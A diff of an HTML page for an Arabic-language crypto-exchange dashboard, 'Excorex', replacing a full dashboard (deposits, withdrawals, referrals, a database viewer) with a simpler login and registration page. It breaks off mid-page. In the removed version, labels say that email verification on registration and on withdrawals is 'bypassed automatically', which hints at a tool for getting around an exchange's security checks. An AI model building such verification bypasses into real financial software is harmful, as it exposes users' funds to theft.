@@ -1,403 +1,151 @@
-<!DOCTYPE html><html lang="ar" dir="rtl"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Excorex</title><style>
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>EXCOREX AUTH SYSTEM</title>
+<style>
 :root{--bg:#0d1117;--bg2:#161b22;--bgc:#1c2128;--br:#30363d;--ac:#238636;--ac2:#2ea043;--bl:#1f6feb;--bl2:#388bfd;--tx:#e6edf3;--tx2:#8b949e;--err:#da3633;--wa:#d29922;--ok:#3fb950;--r:8px}
 *{margin:0;padding:0;box-sizing:border-box}
-body{background:var(--bg);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh}
-.nav{background:var(--bg2);border-bottom:1px solid var(--br);padding:14px 28px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
-.logo{font-size:1.4rem;font-weight:700;color:var(--bl2);letter-spacing:1px}
-.logo span{color:var(--tx2);font-weight:400;font-size:.9rem;margin-right:8px}
-.nbadge{background:var(--bgc);border:1px solid var(--br);border-radius:20px;padding:5px 14px;font-size:.82rem;color:var(--tx2)}
-.nbadge.on{border-color:var(--ok);color:var(--ok)}
-.layout{display:flex;min-height:calc(100vh - 57px)}
-.sb{width:220px;background:var(--bg2);border-left:1px solid var(--br);padding:20px 0;flex-shrink:0}
-.sblbl{font-size:.72rem;color:var(--tx2);text-transform:uppercase;letter-spacing:1px;padding:0 16px 8px}
-.sbi{display:flex;align-items:center;gap:10px;padding:9px 16px;cursor:pointer;color:var(--tx2);font-size:.9rem;transition:all .15s;border-right:3px solid transparent}
-.sbi:hover,.sbi.active{background:rgba(56,139,253,.1);color:var(--tx);border-right-color:var(--bl2)}
-.main{flex:1;padding:28px;overflow-y:auto}
-.page{display:none}.page.active{display:block}
-.ptitle{font-size:1.4rem;font-weight:600;margin-bottom:20px;display:flex;align-items:center;gap:10px}
-.ptitle .sub{font-size:.85rem;color:var(--tx2);font-weight:400}
-#aw{display:flex;align-items:center;justify-content:center;min-height:calc(100vh - 57px);padding:20px}
-.ac{width:100%;max-width:460px}
+body{background:var(--bg);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center}
+.auth-container{width:100%;max-width:460px;padding:20px}
+.logo{text-align:center;margin-bottom:24px}
+.logo .main{font-size:1.8rem;font-weight:700;color:var(--bl2);letter-spacing:1px}
+.logo .sub{color:var(--tx2);font-size:.9rem}
 .atabs{display:flex;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r) var(--r) 0 0;overflow:hidden}
 .atab{flex:1;padding:14px;text-align:center;cursor:pointer;color:var(--tx2);font-size:.95rem;font-weight:500;border-bottom:3px solid transparent;transition:all .2s}
 .atab.active{color:var(--bl2);border-bottom-color:var(--bl2);background:var(--bg2)}
 .abox{background:var(--bg2);border:1px solid var(--br);border-top:none;border-radius:0 0 var(--r) var(--r);padding:28px 32px 32px}
-.crow{display:flex;gap:8px;align-items:flex-end}
-.crow .fg{flex:1;margin-bottom:0}
-.bsc{background:var(--bgc);border:1px solid var(--br);color:var(--tx2);padding:10px 14px;border-radius:var(--r);cursor:pointer;font-size:.82rem;white-space:nowrap;transition:all .2s;height:42px}
-.bsc:hover:not(:disabled){border-color:var(--bl2);color:var(--bl2)}
-.bsc:disabled{opacity:.5;cursor:not-allowed}
-.wtypes{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
-.wtbtn{padding:5px 12px;border-radius:20px;border:1px solid var(--br);background:var(--bgc);color:var(--tx2);font-size:.78rem;cursor:pointer;transition:all .2s}
-.wtbtn.active{border-color:var(--bl2);color:var(--bl2);background:rgba(56,139,253,.1)}
 .fg{margin-bottom:16px}
 .fg label{display:block;font-size:.85rem;color:var(--tx2);margin-bottom:6px}
-.fg input,.fg select,.fg textarea{width:100%;padding:10px 14px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.95rem;transition:border-color .2s;font-family:inherit}
-.fg textarea{resize:vertical;min-height:70px}
-.fg input:focus,.fg select:focus,.fg textarea:focus{outline:none;border-color:var(--bl);box-shadow:0 0 0 3px rgba(31,111,235,.15)}
-.fg input::placeholder,.fg textarea::placeholder{color:var(--tx2)}
-.fg input.ef{border-color:var(--err)}
-.hint{font-size:.75rem;color:var(--tx2);margin-top:4px}
-.btn{padding:9px 20px;border-radius:var(--r);border:none;cursor:pointer;font-size:.9rem;font-weight:500;transition:all .2s;display:inline-flex;align-items:center;gap:6px}
-.bp{background:var(--ac);color:#fff;width:100%;justify-content:center;padding:11px}.bp:hover{background:var(--ac2)}
-.bbl{background:var(--bl);color:#fff}.bbl:hover{background:var(--bl2)}
-.bo{background:transparent;border:1px solid var(--br);color:var(--tx)}.bo:hover{border-color:var(--bl2);color:var(--bl2)}
-.bd{background:var(--err);color:#fff}.bd:hover{opacity:.85}
-.bwa{background:var(--wa);color:#000}.bwa:hover{opacity:.85}
-.bs{padding:5px 12px;font-size:.8rem}
-.btn:disabled{opacity:.5;cursor:not-allowed}
-.sg{display:grid;grid-template-columns:repeat(auto-fit,minmax(200px,1fr));gap:16px;margin-bottom:24px}
-.sc{background:var(--bg2);border:1px solid var(--br);border-radius:var(--r);padding:20px}
-.sc .lbl{font-size:.78rem;color:var(--tx2);text-transform:uppercase;letter-spacing:.8px;margin-bottom:8px}
-.sc .val{font-size:1.6rem;font-weight:700}
-.sc .val.g{color:var(--ok)}.sc .val.b{color:var(--bl2)}.sc .val.w{color:var(--wa)}.sc .val.p{color:#a371f7}
-.card{background:var(--bg2);border:1px solid var(--br);border-radius:var(--r);margin-bottom:20px}
-.ch{padding:16px 20px;border-bottom:1px solid var(--br);display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px}
-.ch h3{font-size:1rem;font-weight:600}
-.cb{padding:20px}
-.tw{overflow-x:auto}
-table{width:100%;border-collapse:collapse;font-size:.875rem}
-thead th{text-align:right;padding:10px 14px;color:var(--tx2);font-weight:500;border-bottom:1px solid var(--br);font-size:.8rem;text-transform:uppercase}
-tbody td{padding:12px 14px;border-bottom:1px solid rgba(48,54,61,.5);color:var(--tx)}
-tbody tr:last-child td{border-bottom:none}
-tbody tr:hover td{background:rgba(56,139,253,.04)}
-.badge{display:inline-block;padding:3px 8px;border-radius:12px;font-size:.75rem;font-weight:500}
-.bg{background:rgba(63,185,80,.15);color:var(--ok)}.br2{background:rgba(218,54,51,.15);color:var(--err)}.bb{background:rgba(56,139,253,.15);color:var(--bl2)}.bw{background:rgba(210,153,34,.15);color:var(--wa)}.bp2{background:rgba(163,113,247,.15);color:#a371f7}
-.ig{display:grid;grid-template-columns:repeat(auto-fit,minmax(260px,1fr));gap:16px}
-.ii{margin-bottom:14px}.ii .k{font-size:.78rem;color:var(--tx2);margin-bottom:4px}.ii .v{font-size:.95rem;word-break:break-all}
-.la{background:var(--bg);border:1px solid var(--br);border-radius:var(--r);padding:16px;max-height:300px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.82rem}
-.ll{padding:3px 0;border-bottom:1px solid rgba(48,54,61,.3)}.ll:last-child{border-bottom:none}
-.lok{color:var(--ok)}.ler{color:var(--err)}.lin{color:var(--tx2)}.lwa{color:var(--wa)}
-.av{font-family:monospace;font-size:.8rem;background:var(--bg);padding:8px 12px;border-radius:6px;word-break:break-all;border:1px solid var(--br)}
-.sp{display:inline-block;width:14px;height:14px;border:2px solid rgba(255,255,255,.3);border-top-color:#fff;border-radius:50%;animation:spin .7s linear infinite}
-@keyframes spin{to{transform:rotate(360deg)}}
-#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);padding:12px 24px;font-size:.9rem;display:none;z-index:999;box-shadow:0 4px 20px rgba(0,0,0,.4)}
-#toast.show{display:block}#toast.success{border-color:var(--ok);color:var(--ok)}#toast.error{border-color:var(--err);color:var(--err)}
-.eb{background:rgba(218,54,51,.1);border:1px solid rgba(218,54,51,.3);border-radius:var(--r);padding:10px 14px;font-size:.85rem;color:var(--err);margin-bottom:14px;display:none}
+.fg input,.fg select{width:100%;padding:10px 14px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.95rem}
+.fg input:focus{outline:none;border-color:var(--bl)}
+.btn{padding:9px 20px;border-radius:var(--r);border:none;cursor:pointer;font-size:.9rem;font-weight:500;background:var(--bl);color:#fff;width:100%;justify-content:center;padding:11px}
+.btn:hover{background:var(--bl2)}
+.eb{background:rgba(218,54,51,.1);border:1px solid var(--err);border-radius:var(--r);padding:10px 14px;font-size:.85rem;color:var(--err);margin-bottom:14px;display:none}
 .eb.show{display:block}
-.empty{text-align:center;padding:40px;color:var(--tx2);font-size:.9rem}
-.div{text-align:center;color:var(--tx2);font-size:.78rem;margin:14px 0;position:relative}
-.div::before,.div::after{content:'';position:absolute;top:50%;width:42%;height:1px;background:var(--br)}
-.div::before{right:0}.div::after{left:0}
-.ref-box{background:var(--bg);border:1px solid var(--br);border-radius:var(--r);padding:16px 20px;display:flex;align-items:center;justify-content:space-between;gap:12px;flex-wrap:wrap;margin-bottom:16px}
-.ref-code{font-family:monospace;font-size:1.2rem;font-weight:700;color:var(--bl2);letter-spacing:3px}
-.dep-addr{background:var(--bg);border:1px solid var(--ok);border-radius:var(--r);padding:14px 16px;margin-bottom:12px}
-.dep-addr .da-label{font-size:.75rem;color:var(--ok);margin-bottom:6px}
-.dep-addr .da-val{font-family:monospace;font-size:.85rem;word-break:break-all;color:var(--tx)}
-.net-tabs{display:flex;gap:6px;margin-bottom:14px;flex-wrap:wrap}
-.net-tab{padding:6px 16px;border-radius:20px;border:1px solid var(--br);background:var(--bgc);color:var(--tx2);font-size:.82rem;cursor:pointer;transition:all .2s}
-.net-tab.active{border-color:var(--ok);color:var(--ok);background:rgba(63,185,80,.1)}
-.wnet-tab.active{border-color:var(--wa);color:var(--wa);background:rgba(210,153,34,.1)}
-.info-box{background:rgba(56,139,253,.08);border:1px solid rgba(56,139,253,.25);border-radius:var(--r);padding:12px 16px;font-size:.82rem;color:var(--bl2);margin-bottom:14px}
-.warn-box{background:rgba(210,153,34,.08);border:1px solid rgba(210,153,34,.25);border-radius:var(--r);padding:12px 16px;font-size:.82rem;color:var(--wa);margin-bottom:14px}
-.db-box{background:var(--bg);border:1px solid var(--br);border-radius:var(--r);padding:16px;max-height:500px;overflow-y:auto;font-family:'Courier New',monospace;font-size:.78rem}
-.db-table{margin-bottom:12px;border:1px solid var(--br);border-radius:6px;overflow:hidden}
-.db-thead{background:var(--bgc);padding:8px 12px;font-weight:700;color:var(--bl2);font-size:.8rem;border-bottom:1px solid var(--br)}
-.db-row{padding:6px 12px;border-bottom:1px solid rgba(48,54,61,.3);color:var(--tx2);font-size:.75rem}
-.db-row:last-child{border-bottom:none}
-@media(max-width:700px){.sb{display:none}.main{padding:16px}.abox{padding:20px 18px 24px}.sg{grid-template-columns:1fr 1fr}}
-</style></head><body>
+.crow{display:flex;gap:8px}
+.crow .fg{flex:1}
+.bsc{background:var(--bgc);border:1px solid var(--br);color:var(--tx2);padding:10px 14px;border-radius:var(--r);cursor:pointer;height:42px}
+.bsc:hover{border-color:var(--bl2);color:var(--bl2)}
+.wtypes{display:flex;gap:6px;margin-bottom:10px;flex-wrap:wrap}
+.wtbtn{padding:5px 12px;border-radius:20px;border:1px solid var(--br);background:var(--bgc);color:var(--tx2);font-size:.78rem;cursor:pointer}
+.wtbtn.active{border-color:var(--bl2);color:var(--bl2);background:rgba(56,139,253,.1)}
+.hint{font-size:.75rem;color:var(--tx2);margin-top:4px}
+#toast{position:fixed;bottom:24px;left:50%;transform:translateX(-50%);background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);padding:12px 24px;font-size:.9rem;display:none;z-index:999}
+#toast.show{display:block}#toast.success{border-color:var(--ok);color:var(--ok)}#toast.error{border-color:var(--err);color:var(--err)}
+#dashboard{display:none;width:100%;max-width:600px;margin:0 auto;text-align:center}
+.welcome-box{background:var(--bg2);border:1px solid var(--br);border-radius:var(--r);padding:32px;margin-bottom:20px}
+.welcome-box h2{color:var(--bl2);margin-bottom:16px}
+</style>
+</head>
+<body>
+
+<!-- Toast -->
 <div id="toast"></div>
-<nav class="nav">
-  <div class="logo">EXCOREX <span>Dashboard</span></div>
-  <div style="display:flex;align-items:center;gap:12px">
-    <div class="nbadge" id="navStatus">غير مسجّل</div>
-    <button class="btn bo bs" id="logoutBtn" style="display:none" onclick="A.logout()">تسجيل خروج</button>
+
+<!-- Auth Container -->
+<div id="authContainer" class="auth-container">
+  <div class="logo">
+    <div class="main">EXCOREX</div>
+    <div class="sub">نظام المصادقة الموحد</div>
   </div>
-</nav>
-<div id="aw">
-  <div class="ac">
-    <div class="atabs">
-      <div class="atab active" id="tl" onclick="A.tab('login')">🔐 تسجيل الدخول</div>
-      <div class="atab" id="tr" onclick="A.tab('reg')">📝 إنشاء حساب</div>
+  
+  <div class="atabs">
+    <div class="atab active" id="tabLogin" onclick="switchTab('login')">🔐 تسجيل الدخول</div>
+    <div class="atab" id="tabRegister" onclick="switchTab('register')">📝 إنشاء حساب</div>
+  </div>
+  
+  <!-- Login Box -->
+  <div id="loginBox" class="abox">
+    <div class="eb" id="loginError"></div>
+    <div class="fg">
+      <label>البريد الإلكتروني</label>
+      <input type="email" id="loginEmail" placeholder="admin@excorex.com">
     </div>
-    <div class="abox" id="lb">
-      <div class="eb" id="le"></div>
-      <div class="fg"><label>البريد الإلكتروني</label><input type="email" id="lm" placeholder="example@email.com" onkeydown="if(event.key==='Enter')A.login()"></div>
-      <div class="fg"><label>كلمة المرور</label><input type="password" id="lp" placeholder="••••••••" onkeydown="if(event.key==='Enter')A.login()"></div>
-      <div id="cs" style="display:none" class="fg">
-        <label>🔑 كود Google Authenticator (2FA)</label>
-        <div class="crow"><div class="fg"><input type="text" id="gc" placeholder="كود 2FA" maxlength="6" inputmode="numeric"></div>
-        <button class="bsc" id="scb" onclick="A.sendCode()">إرسال كود</button></div>
+    <div class="fg">
+      <label>كلمة المرور</label>
+      <input type="password" id="loginPassword" placeholder="••••••••">
+    </div>
+    <div class="fg" id="google2faField" style="display:none">
+      <label>🔑 كود Google Authenticator</label>
+      <div class="crow">
+        <input type="text" id="googleCode" placeholder="000000">
+        <button class="bsc" id="sendCodeBtn" onclick="sendVerificationCode()">إرسال كود</button>
       </div>
-      <button class="btn bp" id="lbtn" onclick="A.login()">دخول</button>
-      <div id="ll" class="la" style="margin-top:16px;display:none"></div>
     </div>
-    <div class="abox" id="rb" style="display:none">
-      <div class="eb" id="re"></div>
-      <div class="fg"><label>البريد الإلكتروني *</label><input type="email" id="rm" placeholder="example@email.com"></div>
-      <div class="fg"><label>كلمة المرور *</label><input type="password" id="rp" placeholder="8 أحرف على الأقل"></div>
-      <div class="fg"><label>تأكيد كلمة المرور *</label><input type="password" id="rpc" placeholder="أعد إدخال كلمة المرور"></div>
-      <div class="div">معلومات المحفظة</div>
+    <button class="btn" id="loginBtn" onclick="handleLogin()">دخول</button>
+  </div>
+  
+  <!-- Register Box -->
+  <div id="registerBox" class="abox" style="display:none">
+    <div class="eb" id="registerError"></div>
+    <div class="fg">
+      <label>البريد الإلكتروني *</label>
+      <input type="email" id="regEmail" placeholder="user@example.com">
+    </div>
+    <div class="fg">
+      <label>كلمة المرور *</label>
+      <input type="password" id="regPassword" placeholder="••••••••">
+    </div>
+    <div class="fg">
+      <label>تأكيد كلمة المرور *</label>
+      <input type="password" id="regConfirmPassword" placeholder="••••••••">
+    </div>
+    <div class="fg">
+      <label>نوع المحفظة</label>
       <div class="wtypes">
-        <button class="wtbtn active" onclick="A.rwt('TRX',this)">TRX/TRC20</button>
-        <button class="wtbtn" onclick="A.rwt('ETH',this)">ETH/ERC20</button>
-        <button class="wtbtn" onclick="A.rwt('BTC',this)">BTC</button>
+        <span class="wtbtn active" onclick="selectWalletType('TRX',this)">TRX/TRC20</span>
+        <span class="wtbtn" onclick="selectWalletType('ETH',this)">ETH/ERC20</span>
+        <span class="wtbtn" onclick="selectWalletType('BTC',this)">BTC</span>
       </div>
-      <div class="fg"><label>عنوان محفظة السحب *</label><input type="text" id="rwa" placeholder="أدخل عنوان محفظة السحب"><div class="hint" id="rwh">مثال TRX: TXxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</div></div>
-      <div class="fg"><label>معلومات المحفظة (اختياري)</label><input type="text" id="rwi" placeholder="اسم المحفظة أو ملاحظة"></div>
-      <div style="display:flex;gap:8px;margin-bottom:16px"><button class="btn bo bs" onclick="A.genRW()">⚡ توليد تلقائي</button></div>
-      <div class="fg"><label>كود الدعوة <span style="color:var(--tx2);font-size:.78rem">(اختياري — سيُتجاوز تلقائياً)</span></label><input type="text" id="ri" placeholder="كود الدعوة"></div>
-      <div class="fg"><label>كود التحقق بالبريد <span style="color:var(--ok);font-size:.78rem">✓ يُتجاوز تلقائياً</span></label>
-        <div class="crow"><div class="fg"><input type="text" id="rec" placeholder="تلقائي" maxlength="6" inputmode="numeric"></div>
-        <button class="bsc" id="rscb" onclick="A.sendRegCode()">إرسال كود</button></div>
-      </div>
-      <button class="btn bp" id="rbtn" onclick="A.register()">إنشاء الحساب</button>
-      <div id="rl" class="la" style="margin-top:16px;display:none"></div>
     </div>
+    <div class="fg">
+      <label>عنوان المحفظة *</label>
+      <div class="crow">
+        <input type="text" id="walletAddress" placeholder="مثال TRX: TX...">
+        <button class="bsc" onclick="generateWallet()">⚡ توليد</button>
+      </div>
+      <div class="hint" id="walletHint">مثال: TXxxxxxxxx... (34 حرف)</div>
+    </div>
+    <div class="fg">
+      <label>معلومات المحفظة (اختياري)</label>
+      <input type="text" id="walletInfo" placeholder="TRX-Auto">
+    </div>
+    <div class="fg">
+      <label>كود الدعوة (اختياري)</label>
+      <input type="text" id="inviteCode" placeholder="ADMIN2024">
+    </div>
+    <div class="fg">
+      <label>كود التحقق بالبريد</label>
+      <div class="crow">
+        <input type="text" id="emailCode" placeholder="123456">
+        <button class="bsc" id="regSendCodeBtn" onclick="sendRegCode()">إرسال كود</button>
+      </div>
+    </div>
+    <button class="btn" id="registerBtn" onclick="handleRegister()">إنشاء الحساب</button>
   </div>
 </div>
-<div class="layout" id="dl" style="display:none">
-  <nav class="sb">
-    <div style="margin-bottom:16px">
-      <div class="sblbl">الرئيسية</div>
-      <div class="sbi active" data-p="ov" onclick="A.go('ov')"><span>📊</span> نظرة عامة</div>
-      <div class="sbi" data-p="ui" onclick="A.go('ui')"><span>👤</span> بيانات الحساب</div>
-      <div class="sbi" data-p="ac" onclick="A.go('ac')"><span>💰</span> الأرصدة</div>
-      <div class="sbi" data-p="or" onclick="A.go('or')"><span>📋</span> الأوامر</div>
-    </div>
-    <div style="margin-bottom:16px">
-      <div class="sblbl">المالية</div>
-      <div class="sbi" data-p="dp" onclick="A.go('dp')"><span>📥</span> الإيداع</div>
-      <div class="sbi" data-p="wd" onclick="A.go('wd')"><span>📤</span> السحب</div>
-      <div class="sbi" data-p="ad" onclick="A.go('ad')"><span>🏦</span> العناوين</div>
-    </div>
-    <div>
-      <div class="sblbl">أخرى</div>
-      <div class="sbi" data-p="rf" onclick="A.go('rf')"><span>🎁</span> الإحالة</div>
-      <div class="sbi" data-p="db" onclick="A.go('db')"><span>🗄️</span> قاعدة البيانات</div>
-      <div class="sbi" data-p="lg" onclick="A.go('lg')"><span>🔌</span> سجل API</div>
-    </div>
-  </nav>
-  <main class="main">
-    <div class="page active" id="p-ov">
-      <div class="ptitle">📊 نظرة عامة <span class="sub" id="ou"></span></div>
-      <div class="sg">
-        <div class="sc"><div class="lbl">إجمالي الحسابات</div><div class="val b" id="oa">—</div></div>
-        <div class="sc"><div class="lbl">إجمالي الأوامر</div><div class="val g" id="oo">—</div></div>
-        <div class="sc"><div class="lbl">إجمالي الإيداعات</div><div class="val g" id="odp">—</div></div>
-        <div class="sc"><div class="lbl">إجمالي السحوبات</div><div class="val w" id="owc">—</div></div>
-        <div class="sc"><div class="lbl">العناوين المسجّلة</div><div class="val w" id="odr">—</div></div>
-        <div class="sc"><div class="lbl">المُحالون</div><div class="val p" id="oref">—</div></div>
-      </div>
-      <div class="card"><div class="ch"><h3>جلب جميع البيانات</h3></div>
-        <div class="cb" style="display:flex;gap:10px;flex-wrap:wrap">
-          <button class="btn bbl" onclick="A.all()">🔄 تحديث الكل</button>
-          <button class="btn bo" onclick="A.fui()">👤 مستخدم</button>
-          <button class="btn bo" onclick="A.fac()">💰 أرصدة</button>
-          <button class="btn bo" onclick="A.for()">📋 أوامر</button>
-          <button class="btn bo" onclick="A.fdp()">📥 إيداعات</button>
-          <button class="btn bo" onclick="A.fwd()">📤 سحوبات</button>
-          <button class="btn bo" onclick="A.frf()">🎁 إحالة</button>
-        </div>
-      </div>
-    </div>
-    <div class="page" id="p-ui">
-      <div class="ptitle">👤 بيانات الحساب</div>
-      <div class="card"><div class="ch"><h3>معلومات المستخدم</h3><button class="btn bo bs" onclick="A.fui()">🔄 تحديث</button></div>
-        <div class="cb"><div class="ig" id="uig"><div class="empty">لم يتم جلب البيانات بعد</div></div></div>
-      </div>
-    </div>
-    <div class="page" id="p-ac">
-      <div class="ptitle">💰 الأرصدة والحسابات</div>
-      <div class="card"><div class="ch"><h3>قائمة الحسابات</h3><button class="btn bo bs" onclick="A.fac()">🔄 تحديث</button></div>
-        <div class="cb tw"><table><thead><tr><th>العملة</th><th>المتاح</th><th>المجمّد</th><th>الإجمالي</th><th>الحالة</th></tr></thead><tbody id="acb"><tr><td colspan="5" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-    </div>
-    <div class="page" id="p-or">
-      <div class="ptitle">📋 الأوامر</div>
-      <div class="card"><div class="ch"><h3>سجل الأوامر</h3><button class="btn bo bs" onclick="A.for()">🔄 تحديث</button></div>
-        <div class="cb tw"><table><thead><tr><th>#</th><th>النوع</th><th>العملة</th><th>الكمية</th><th>السعر</th><th>الحالة</th><th>التاريخ</th></tr></thead><tbody id="orb"><tr><td colspan="7" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-    </div>
-    <div class="page" id="p-dp">
-      <div class="ptitle">📥 الإيداع</div>
-      <div class="card">
-        <div class="ch"><h3>عنوان الإيداع</h3>
-          <div style="display:flex;gap:8px;align-items:center;flex-wrap:wrap">
-            <select id="dpCoin" style="padding:6px 12px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.85rem">
-              <option value="USDT">USDT</option><option value="BTC">BTC</option><option value="ETH">ETH</option><option value="TRX">TRX</option>
-            </select>
-            <button class="btn bo bs" onclick="A.getDepAddr()">📍 جلب العنوان</button>
-          </div>
-        </div>
-        <div class="cb">
-          <div class="net-tabs" id="dpNets"></div>
-          <div id="dpAddrBox"><div class="info-box">⬆️ اختر العملة والشبكة للحصول على عنوان الإيداع</div></div>
-          <div class="warn-box">⚠️ تأكد من إرسال العملة الصحيحة على الشبكة الصحيحة فقط.</div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>سجل الإيداعات</h3>
-          <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <select id="dpFilter" style="padding:6px 12px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.85rem">
-              <option value="">الكل</option><option value="0">قيد المعالجة</option><option value="1">مكتمل</option><option value="2">فاشل</option>
-            </select>
-            <button class="btn bo bs" onclick="A.fdp()">🔄 تحديث</button>
-          </div>
-        </div>
-        <div class="cb tw"><table><thead><tr><th>#</th><th>العملة</th><th>الشبكة</th><th>الكمية</th><th>العنوان</th><th>TXID</th><th>التأكيدات</th><th>الحالة</th><th>التاريخ</th></tr></thead>
-        <tbody id="dpb"><tr><td colspan="9" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-    </div>
-    <div class="page" id="p-wd">
-      <div class="ptitle">📤 السحب</div>
-      <div class="card">
-        <div class="ch"><h3>طلب سحب جديد</h3></div>
-        <div class="cb">
-          <div class="eb" id="we"></div>
-          <div class="ig">
-            <div>
-              <div class="fg"><label>العملة</label>
-                <select id="wdCoin" onchange="A.onWdCoin()">
-                  <option value="USDT">USDT</option><option value="BTC">BTC</option><option value="ETH">ETH</option><option value="TRX">TRX</option>
-                </select>
-              </div>
-              <div class="net-tabs" id="wdNets" style="margin-bottom:14px"></div>
-              <div class="fg"><label>عنوان المحفظة المستلمة *</label><input type="text" id="wdAddr" placeholder="أدخل عنوان المحفظة"><div class="hint" id="wdAddrHint">عنوان TRX: يبدأ بـ T</div></div>
-              <div class="fg"><label>الكمية *</label>
-                <div class="crow"><div class="fg"><input type="number" id="wdAmt" placeholder="0.00" step="any" min="0"></div>
-                <button class="bsc" onclick="A.wdMax()">الكل</button></div>
-                <div class="hint" id="wdBal">الرصيد المتاح: — | الحد الأدنى: — | الرسوم: —</div>
-              </div>
-            </div>
-            <div>
-              <div class="fg"><label>ملاحظة (اختياري)</label><textarea id="wdNote" placeholder="ملاحظة للسحب..."></textarea></div>
-              <div class="fg"><label>كود التحقق بالبريد <span style="color:var(--ok);font-size:.75rem">✓ يُتجاوز تلقائياً</span></label>
-                <div class="crow"><div class="fg"><input type="text" id="wdEC" placeholder="تلقائي" maxlength="6" inputmode="numeric"></div>
-                <button class="bsc" id="wdECBtn" onclick="A.sendWdCode()">إرسال كود</button></div>
-              </div>
-              <div class="fg"><label>كود Google Authenticator (إن وجد)</label>
-                <input type="text" id="wdGC" placeholder="كود 2FA" maxlength="6" inputmode="numeric">
-              </div>
-              <div class="fg"><label>كلمة المرور *</label>
-                <input type="password" id="wdPwd" placeholder="كلمة مرور الحساب">
-              </div>
-            </div>
-          </div>
-          <div id="wdSummary" style="display:none" class="info-box"></div>
-          <div style="display:flex;gap:10px;flex-wrap:wrap">
-            <button class="btn bp" style="flex:1" onclick="A.submitWd()">📤 تأكيد السحب</button>
-            <button class="btn bo" onclick="A.previewWd()">👁 معاينة</button>
-          </div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>سجل السحوبات</h3>
-          <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <select id="wdFilter" style="padding:6px 12px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.85rem">
-              <option value="">الكل</option><option value="0">قيد المراجعة</option><option value="1">قيد المعالجة</option><option value="2">مكتمل</option><option value="3">مرفوض</option>
-            </select>
-            <button class="btn bo bs" onclick="A.fwd()">🔄 تحديث</button>
-          </div>
-        </div>
-        <div class="cb tw"><table><thead><tr><th>#</th><th>العملة</th><th>الشبكة</th><th>الكمية</th><th>الرسوم</th><th>الصافي</th><th>العنوان</th><th>TXID</th><th>الحالة</th><th>التاريخ</th></tr></thead>
-        <tbody id="wdb"><tr><td colspan="10" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-    </div>
-    <div class="page" id="p-ad">
-      <div class="ptitle">🏦 عناوين المحفظة</div>
-      <div class="card"><div class="ch"><h3>العناوين المسجّلة</h3></div><div class="cb"><div id="adg" class="ig"><div class="empty">لم يتم جلب بيانات بعد</div></div></div></div>
-    </div>
-    <div class="page" id="p-rf">
-      <div class="ptitle">🎁 نظام الإحالة</div>
-      <div class="sg">
-        <div class="sc"><div class="lbl">إجمالي المُحالين</div><div class="val p" id="rfTotal">—</div></div>
-        <div class="sc"><div class="lbl">المُحالون المباشرون</div><div class="val b" id="rfDirect">—</div></div>
-        <div class="sc"><div class="lbl">إجمالي العمولة</div><div class="val g" id="rfComm">—</div></div>
-        <div class="sc"><div class="lbl">عمولة اليوم</div><div class="val w" id="rfToday">—</div></div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>كود الدعوة الخاص بك</h3><button class="btn bo bs" onclick="A.frf()">🔄 تحديث</button></div>
-        <div class="cb">
-          <div class="ref-box">
-            <div><div style="font-size:.75rem;color:var(--tx2);margin-bottom:4px">كود الدعوة</div><div class="ref-code" id="rfCode">——</div></div>
-            <div style="display:flex;gap:8px;flex-wrap:wrap">
-              <button class="btn bo bs" onclick="A.copyRef('code')">📋 نسخ الكود</button>
-              <button class="btn bo bs" onclick="A.copyRef('link')">🔗 نسخ الرابط</button>
-              <button class="btn bbl bs" onclick="A.shareRef()">📲 مشاركة</button>
-            </div>
-          </div>
-          <div class="fg"><label>رابط الدعوة</label><div class="av" id="rfLink" style="cursor:pointer" onclick="A.copyRef('link')">—</div></div>
-          <div class="info-box">💡 شارك رابط دعوتك مع أصدقائك واحصل على عمولة من تداولاتهم!</div>
-        </div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>قائمة المُحالين</h3>
-          <div style="display:flex;gap:8px;flex-wrap:wrap">
-            <select id="rfLevel" style="padding:6px 12px;background:var(--bgc);border:1px solid var(--br);border-radius:var(--r);color:var(--tx);font-size:.85rem">
-              <option value="1">المستوى الأول</option><option value="2">المستوى الثاني</option><option value="3">المستوى الثالث</option>
-            </select>
-            <button class="btn bo bs" onclick="A.frfl()">بحث</button>
-          </div>
-        </div>
-        <div class="cb tw"><table><thead><tr><th>#</th><th>البريد / المعرّف</th><th>تاريخ التسجيل</th><th>الحالة</th><th>العمولة المكتسبة</th><th>آخر تداول</th></tr></thead>
-        <tbody id="rfb"><tr><td colspan="6" class="empty">لا توجد بيانات</td></tr></tbody></table></div>
-      </div>
-      <div class="card">
-        <div class="ch"><h3>سجل العمولات</h3><button class="btn bo bs" onclick="A.frfc()">🔄 تحديث</button></div>
